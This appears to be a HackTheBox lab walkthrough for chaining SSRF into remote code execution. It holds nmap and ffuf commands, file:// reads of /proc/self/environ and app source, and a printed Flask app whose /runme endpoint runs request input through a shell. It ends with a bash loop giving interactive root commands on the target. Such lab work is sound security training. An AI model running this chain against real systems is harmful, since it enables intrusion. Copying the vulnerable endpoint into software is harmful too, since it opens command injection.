```sh
IP=10.129.201.238
TUNNEL_IP=10.10.14.60 #HTB Tunnel IP

nmap -sC -sV -T5 $IP -oN nmap_ssrf2rce -v 
curl -s -i http://$IP -vv # request to port 80
curl -s -i -L http://$IP -vv # to follow the redirect
```

# Exercise SSRF

## Test q parameter vulnerable to SSRF

### Test with NetCat
```sh
nc -vlnp 8888 # at other terminal
curl -s -i -L http://$IP/load?q=http://$TUNNEL_IP:8888 # test whether request or not
```

### Test with http server

```sh
# create index.html file
python -m http.server 9999
curl -i -s -L http://$IP/load\?q\=http://$TUNNEL_IP:9999/index.html
```

### Test with file server

```sh
python -m twisted ftp -p 2121 -r .
curl -i -s http://$IP/load\?q\=ftp://$TUNNEL_IP:2121/index.html
```

### Test it's internal ip

```sh
for port in {1..65535}; do echo $port >> ports; done # create list of all ports file
curl -i -s -L http://$IP/load\?q\=http://127.0.0.1:1 # test invalid port to filter
ffuf -w ports:PORT -u http://$IP/load\?q\=http://127.0.0.1:PORT -fs 30 # fuzzing all ports and find that 80 and 5000 are opening
curl -i -s -L http://$IP/load\?q\=http://127.0.0.1:80
curl -i -s -L http://$IP/load\?q\=http://127.0.0.1:5000
```

# Attack to `internal.app.local`

```sh
curl -i -s "http://$IP/load?q=http://internal.app.local/load?q=index.html"
curl -i -s "http://$IP/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
ffuf -w ports:PORT -u http://$IP/load\?q\=http://internal.app.local/load\?q\=http::////127.0.0.1:PORT -fr 'Errno[[:blank:]]111' -t 128
# 80 and 5000 are open
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=http::////127.0.0.1:5000 # can see files (internal.py, internal_local.py, etc) like python server using http.server
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=file:://///proc/self/environ -o - # to see the current directory 
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=file:://///app/internal.py # read from internal.py file
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=file:://///app/internal_local.py # read from internal_local.py and found interesting route runme
```

```python
import os
from flask import *
import urllib
import subprocess

basedir = os.path.abspath(os.path.dirname(__file__))

app = Flask(__name__)

def run_command(command):
	p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	stdout = p.stdout.read()
	stderr = p.stderr.read()
	result = stdout.decode() + " " + stderr.decode()
	return result

@app.route("/")
def index():
	return run_command("ls -lha")

@app.route("/runme")
def runmewithargs():
	command = request.args.get("x")
	if command == "":
		return "Use /runme?x=<CMD>"
	return run_command(command)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

```sh
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=http::////127.0.0.1:5000/runme\?x\=whoami
# root
curl -i -s http://$IP/load\?q\=http://internal.app.local/load\?q\=http::////127.0.0.1:5000/runme\?x\="uname -a" # no response and need to url encode 
# we are 3 server depth and need url encode 3 times

echo "uname -a" | jq -rRs @uri | jq -rRs @uri | jq -rRs @uri # uname%252520-a%25250A%250A%0A
curl -i -s "http://$IP/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname%252520-a%25250A%250A%0A"

```

```sh
function rce {
	while true; do
		echo -n "> "; read cmd
		ecmd=$(echo -n $cmd | jq -rRs @uri | jq -rRs @uri | jq -rRs @uri)
		curl -s -o - "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
		echo ""
	done		
}
```

- run this rce to get the root access 